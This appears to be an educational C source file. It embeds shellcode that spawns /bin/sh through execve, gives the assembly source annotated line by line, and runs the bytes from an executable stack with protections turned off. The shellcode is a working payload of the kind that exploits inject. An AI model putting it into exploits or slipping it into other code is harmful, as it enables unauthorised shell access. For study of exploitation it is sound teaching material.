/*
 * Example of simple execve('/bin/sh', ...); shellcode compiled
 * and embedded within C program, then compiled on 64-bit with NX bit
 * turned off and set executable stack.
 *
 * Compilation:
 * 	$ gcc -fno-stack-protector -z execstack  execve1.c -o execve1c
*/

/* 
  ; Compilation: nasm -f bin file.asm -o file.bin
  BITS 64
  global _start

  _start:
	  jmp short	calleip

  shellcode:
	  pop 		rsi
	  xor 		rax, rax
	  mov byte 	[rsi + 7], al
	  lea 		rbx, [rsi]
	  mov qword	[rsi + 8], rbx 
	  mov qword	[rsi + 16], rax 
	  mov byte	al, 0x0b		; execve
	  mov			rbx, rsi
	  lea			rcx, [rsi + 8]
	  lea			rdx, [rsi + 16]
	  ; execve('/bin/sh', { '/bin/sh', 0}, 0);
	  int			0x80

  calleip:
	  call		shellcode

	  ; Buffer containing parameters to be passed
	  ; to execve(); At the 0 position it starts with
	  ; /bin/sh path. Then at the position of 'A' will be
	  ; null byte inserted effectively ending the string.
	  ; Then the address of /bin/sh itself is going to be 
	  ; inserted in place of 'BBBBBBBBB' sequence and followed by
	  ; 'CCCCCCCC' substituted by 00000000 qword value ending array.
	  db			'/bin/shABBBBBBBBCCCCCCCC'
*/
char shellcode[64] = 
    "\xeb\x21\x5e\x48\x31\xc0\x88\x46\x07\x48\x8d\x1e\x48\x89\x5e\x08"
    "\x48\x89\x46\x10\xb0\x0b\x48\x89\xf3\x48\x8d\x4e\x08\x48\x8d\x56"
    "\x10\xcd\x80\xe8\xda\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41"
    "\x42\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43\x43\x43";

int main()
{
	int (*func)();
	func = (int (*)())shellcode;
	(int)(*func)();
}
